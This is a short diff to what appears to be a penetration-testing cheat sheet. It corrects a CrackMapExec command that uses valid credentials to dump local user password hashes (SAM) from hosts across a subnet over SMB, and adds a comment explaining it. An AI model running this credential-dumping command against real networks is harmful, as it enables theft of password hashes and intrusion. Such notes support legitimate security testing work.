@@ -1,5 +1,5 @@
-// 
+// With valid credentials, will dump local user hashes (not Domain).
 ```
-cme smb 1.2.3.4/24 -u ValidUser -p ValidPass --same
+cme smb 1.2.3.4/24 -u ValidUser -p ValidPass --sam
 ```
 
